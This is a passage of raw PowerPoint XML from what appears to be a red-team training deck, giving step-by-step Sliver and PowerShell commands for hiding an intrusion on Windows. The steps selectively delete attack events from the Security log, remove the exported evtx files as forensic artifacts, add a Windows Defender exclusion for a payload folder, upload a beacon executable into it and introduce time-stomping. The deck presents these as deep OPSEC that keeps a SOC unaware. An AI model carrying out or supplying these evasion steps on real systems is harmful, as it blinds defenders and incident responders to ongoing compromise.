              <a:rPr lang="en-US" sz="3100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -c "Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>WinEvent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>FilterHashtable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> @{LogName='Security'; ID=4624} -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MaxEvents</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 20 | Format-List </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>TimeCreated</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, Message"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>After deletion:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>execute -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -c "Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>WinEvent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>FilterHashtable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> @{LogName='Security'; ID=4624} -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MaxEvents</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 20 | Format-List </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>TimeCreated</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, Message"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Compare the outputs. Your attack events are gone.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="3100" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Step 11: Clean Up (Delete the Exported Files)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Delete the temporary exported files to remove forensic artifacts:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>execute -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -c "Remove-Item C:\temp\security_backup.evtx -Force"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>execute -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -c "Remove-Item C:\temp\target_events.evtx -Force“</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="3100" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Summary – What You Have Achieved:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>You identified your attack's Event IDs in Part 1.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>You built an XPath query to target only those specific events.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>You used </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EvtClearLog</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> (via execute-assembly) to delete only your events.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>You verified that your events are gone while everything else remains.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="13266081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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="85000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Takeaway:-</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Clearing the entire Security log with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>wevtutil</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> cl generates Event ID 1102 and instantly alerts the SOC. Selective deletion leaves the log intact. The SOC sees a normal log with no missing gaps. This is deep OPSEC.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>TASK 01 – PART 3: TIME-STOMPING</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>What Is Time-Stomping?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Time-stomping is the technique of altering file system timestamps (Creation Date, Last Modified Date, Last Access Date) to make malicious files appear legitimate and old. This helps evade forensic investigation because incident responders often rely on file timelines to identify attacker activity. If your payload files have the same timestamps as legitimate system files (e.g., 2018), they blend in.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Why Two Steps?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 1 – Defender Exclusion: Temporarily exclude your payload folder from Windows Defender scans. This prevents Defender from quarantining or flagging your files while you work.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 2 – </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Timestomp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>: Reset the file creation and modification dates of your payload files to an older date (like 2018). This hides your files from timeline-based forensic analysis.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="6626877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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 1: Exclude Payload Folder from Defender Scans</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>First, create a folder for your payload (if it doesn't already exist):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>execute -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -c "New-Item -ItemType Directory -Path C:\payload -Force"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Add the folder to Defender's exclusion list. This prevents Defender from scanning anything inside it.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>execute -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -c "Set-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>MpPreference</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>ExclusionPath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> 'C:\payload'"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Verify the exclusion was added:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>execute -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -c "Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>MpPreference</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> | Select-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>ExclusionPath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>You should see C:\payload listed.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 2: Drop or Move Your Payload Files into the Excluded Folder</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Now transfer your payload files (e.g., beacon.exe, test.exe, DLLs, scripts) into C:\payload.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>In Sliver:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>upload /path/to/beacon.exe C:\payload\beacon.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Or move existing files:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>execute -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -c "Move-Item C:\Users\Public\beacon.exe C:\payload\beacon.exe“</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="28323936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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="70000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="0" i="0" dirty="0">
